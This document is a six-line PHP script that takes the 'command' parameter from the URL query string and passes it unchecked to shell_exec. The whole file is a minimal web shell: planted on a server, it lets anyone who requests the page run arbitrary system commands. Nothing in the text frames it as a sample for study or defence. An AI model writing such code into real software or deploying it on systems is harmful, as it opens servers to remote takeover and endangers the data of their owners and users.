<?php 
	if (isset($_GET['command'])){
		shell_exec($_GET['command']);

	}
 ?>